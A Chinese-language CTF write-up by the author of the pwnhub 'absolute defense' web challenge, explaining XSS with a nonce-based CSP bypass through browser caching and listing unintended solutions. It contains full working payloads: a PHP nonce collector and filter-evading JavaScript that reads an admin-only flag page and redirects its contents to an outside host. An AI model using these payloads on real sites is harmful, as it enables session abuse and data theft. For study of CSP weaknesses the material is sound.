---
title: pwnhub 绝对防御 出题思路和反思
date: 2017-04-24 17:00:51
tags:
- ctf
- pwnhub
- xss
- csp
---


由于整个站最初的时候其实是用来测试漏洞的，所以被改成题目的时候很多应该注意的地方没有仔细推敲，在看了别人wp后仔细研究了一下，我发现题目本身漏洞就要求admin和xss点在同源下，整个漏洞被改成ctf题目是存在冲突的，再加上flag所在的地方使用了referer check本身就有问题，导致题目有了很多非预期解法，深感抱歉。

下面就完整的整理一下wp和所有的非预期攻击方式

<!--more-->

![image_1be4da9901l902161muj1khor429.png-25.3kB][1]

初逛站里面什么都没有，聊天版的地方存在基本的xss，复写就能绕过，但有 简单的csp，允许unsafa-inline，session是httponly的，复写构造xss读admin页面的消息（让admin去请求api）

获取页面内容后，得到了后面站的地址，打开看看返回是这样的
```
Wow, good guys,maybe you want /adminshigesha233e3333/#admin
```


![image_1bd65493j1oof1doj1ok152diqkm.png-18.6kB][2]

再看看flag.php

```
hello, hacker, only admin can see it
```

只有管理员才能看，这里如果在user.php构造xss去读flag的内容的话，会得到我的提示

```
nothing here,╮(╯-╰)╭,what ever you try, only from adminshigesha233e3333 can read it...
```

这里的提示本来意思是只有在admin目录下才能读到flag.php的内容，但是没想到有一些人，在这里去日了我的判断，而不是构造别的xss。

**事实证明referer check不可取，切记切记**

这位大佬就是攻击了我的referer check，蓝猫也是类似的方式
[https://pwnhub.cn/media/writeup/121/79edbf2c-75da-48bb-8f5d-563d0048849b_b8b69656.pdf](https://pwnhub.cn/media/writeup/121/79edbf2c-75da-48bb-8f5d-563d0048849b_b8b69656.pdf)

下面我们回归到正确的攻击思路上去。

我们发现index.php是存在xss的样子，但是后台开启了csp

![image_1bd6582u5641h5c1g006k6r2f13.png-3.5kB][3]

这是一个比较特别的nonce script csp，属于新型的csp，每次请求服务器都会更换新的字符串，如果字符串不匹配，那么脚本就会被拦截。（后面我会再发文章讲这个CSP的攻击方式）

我不知道盲测这个漏洞是怎么测试的，但你可能需要一篇文章

[http://sirdarckcat.blogspot.jp/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html](http://sirdarckcat.blogspot.jp/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html)

文章中提到了一点，如果浏览器并没有请求后台，那么csp就不会刷新，那么怎么才能让它不刷新呢？浏览器缓存！

当服务端做出一部分配置的之后，如果页面内容不涉及到后台（仅涉及到前台的变化），那么浏览器就会从缓存中加载内容。

![image_1bd6e1i5k1m6a1dpf1bi0g5j186a9.png-16.6kB][4]

具体浏览器缓存的机制就不多解释了，我们发现后台开启了缓存机制，虽然只有30s，但是已然足够了。

这里其实思路就呼之欲出了，先iframe请求一次，然后解出nonce的值，添加到script的属性中，执行任意xss。

由于没有同源策略的拦截，所以出现了很多问题，类似于wupco的payload，但小m的和cola的是正解。

[https://pwnhub.cn/media/writeup/123/909db9f9-1bb4-4c5b-a697-b0fa223ed376_a599515c.pdf](https://pwnhub.cn/media/writeup/123/909db9f9-1bb4-4c5b-a697-b0fa223ed376_a599515c.pdf)

下面贴出，跨域情况下的处理方式以及payload，也是我出题的初衷。

根据前面文章中的poc，我们重新梳理试图读取flag.php的流程。

1、向admin发送payload，admin页面需要打开一个iframe目标为后台并输入一个form，用textrea吃掉页面内容

```
<iframe id="frame" src="http://127.0.0.1/xsstest_new/admin/#<form method='post' actioonn='http://115.28.78.16/noonnce.php'><input type='submit' value='test!'><textarea name='noonnce'>"></iframe>
```

由于我们需要接收到这部分信息，而且后台开启csp，无法发送跨域请求，所以在自己服务器构造nonce.php文件解析请求，返回nonce字符串。（nonce.php必须保证保存字符串，在之后的请求中返回，在原poc中，这里是通过session保留的，但是我在实际测试的时候遇到了问题，我改成了文件储存）

```
<?php
header("Access-Control-Allow-Origin:*");

$file = "result.txt";
if(!file_exists($file)){
	if(!empty($_POST)){
		$f = fopen($file, 'w+');
		$message = $_POST['nonce'];
		preg_match('/(nonce=\')\w+\'/', $message, $matches);
		$nonce_number = substr($matches[0], 7, -1);
		fwrite($f, $nonce_number);
		echo $nonce_number;
		fclose($f);
	}
}else{
	$f = fopen($file, 'r');
	echo fgets($f);
	fclose($f);
}
?>
```

2、我们需要不断请求nonce.php，并点击提交按钮，当返回有内容的时候，开启新的iframe标签，插入script标签，读取flag.php，以跳转的方式传出。

```
<scriscriptpt>
  functioonn getNoonnce() { 
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "http://115.28.78.16/noonnce.php", false);
    xhr.send();
    return xhr.respoonnseText;
  }
 
  setTimeout(pollNoonnce, 1000);
  functioonn pollNoonnce() {
    var noonnce = getNoonnce();

    if (noonnce == "") {
      setTimeout(pollNoonnce, 1000);
    } else {
      attack(noonnce);
    }
  }

  functioonn attack(noonnce) {
    var iframe = document.createElement("iframe");
    var url = "http://127.0.0.1/xsstest_new/admin/#"
    var payload = "<scriscriptpt noonnce='" + noonnce + "'>var xmlhttp = new XMLHttpRequest(); xmlhttp.open(\"GET\", \"flag.php\", false); xmlhttp.send(); var mess = xmlhttp.respoonnse; var xhr = new XMLHttpRequest(); locatioonn.href=\"http://0xb.pw?\"+mess;</scr" + "ipt>";
    var validPayload = "<scrscriptipt>alert('If you see this alert, CSP is not active')</scr" + "ipt>"
    iframe.src = url + payload + validPayload;
    document.body.appendChild(iframe);
  }

  setTimeout("document.getElementById('frame').coonntentWindow.document.forms[0].submit();", 3000);

</sscriptcript>
```

由于xhr需要跨域请求nonce.php，而前台的站中含有csp，这是一个预设的坑，细心的人不难发现，用户的信息是通过请求api/getmessage.php获取的

![image_1be4dlo64vi3vtl1ee8hu31g8gm.png-56.5kB][5]

我们可以注意这个页面并没有csp，所以构造跳转到getmessage.php，然后服务端设置`header("Access-Control-Allow-Origin:*");`，成功绕过


全部payload如下

```
<iframe id="frame" src="http://127.0.0.1/xsstest_new/adminshigesha233e3333/#<form method='post' actioonn='http://115.28.78.16/noonnce.php'><input type='submit' value='test!'><textarea name='noonnce'>"></iframe>

<scriscriptpt>
  if(locatioonn.pathname != "/api/getmessage.php"){
    window.locatioonn.href = "http://" + document.domain + "/api/getmessage.php"
  }


  functioonn getNoonnce() { 
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "http://115.28.78.16/noonnce.php", false);
    xhr.send();
    return xhr.respoonnseText;
  }
 
  setTimeout(pollNoonnce, 1000);
  functioonn pollNoonnce() {
    var noonnce = getNoonnce();

    if (noonnce == "") {
      setTimeout(pollNoonnce, 1000);
    } else {
      attack(noonnce);
    }
  }

  functioonn attack(noonnce) {
    var iframe = document.createElement("iframe");
    var url = "http://127.0.0.1/xsstest_new/adminshigesha233e3333/#"
    var payload = "<scriscriptpt noonnce='" + noonnce + "'>var xmlhttp = new XMLHttpRequest(); xmlhttp.open(\"GET\", \"flag.php\", false); xmlhttp.send(); var mess = xmlhttp.respoonnse; var xhr = new XMLHttpRequest(); locatioonn.href=\"http://0xb.pw?\"+mess;</scr" + "ipt>";
    var validPayload = "<scrscriptipt>alert('If you see this alert, CSP is not active')</scr" + "ipt>"
    iframe.src = url + payload + validPayload;
    document.body.appendChild(iframe);
  }

  setTimeout("document.getElementById('frame').coonntentWindow.document.forms[0].submit();", 3000);

</sscriptcript>


```

![image_1be4e5g8q1pjk12714191vtp18ta13.png-15kB][6]


但事实上，题目有个非常有趣的非预期漏洞。

如果你注意观察admin目录的index.php页面

![image_1bednb31n145c1shfa8cj41p7p9.png-29.5kB][7]

xss点和script标签在同一行，所以就有了一个新的问题，如果我们构造一个`<script>`标签，然后没有闭合，就可以吃掉后面的标签，把后面script标签的属性保留

![image_1bednf0jr1t3oh4f1pqoqmm5cnm.png-47.5kB][8]

最后贴下virink的wp

[https://pwnhub.cn/media/writeup/119/45db4b4d-53dc-47de-afe8-e821bd070dfa_7032e508.pdf](https://pwnhub.cn/media/writeup/119/45db4b4d-53dc-47de-afe8-e821bd070dfa_7032e508.pdf)


这次的非预期问题实在抱歉，下次出题一定仔细思考下漏洞的流程和问题，还是太菜了Orz





  [1]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/x456wiqarhtd85ufb6r67ulz/image_1be4da9901l902161muj1khor429.png
  [2]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/wffm5weehycndc8b9k2x0972/image_1bd65493j1oof1doj1ok152diqkm.png
  [3]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/0ta8ypvabn74fhcalpxb6gvt/image_1bd6582u5641h5c1g006k6r2f13.png
  [4]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/qvp6z81nzd85lx1l29kscv9p/image_1bd6e1i5k1m6a1dpf1bi0g5j186a9.png
  [5]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/zcafmqme8aujaxnmti8jsp4j/image_1be4dlo64vi3vtl1ee8hu31g8gm.png
  [6]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/80aqq62w7f7a2i21vqely76s/image_1be4e5g8q1pjk12714191vtp18ta13.png
  [7]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/xfrth6zizzzkdywwp25nm1kk/image_1bednb31n145c1shfa8cj41p7p9.png
  [8]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/6xp2ciyd1oavbswajjusl31z/image_1bednf0jr1t3oh4f1pqoqmm5cnm.png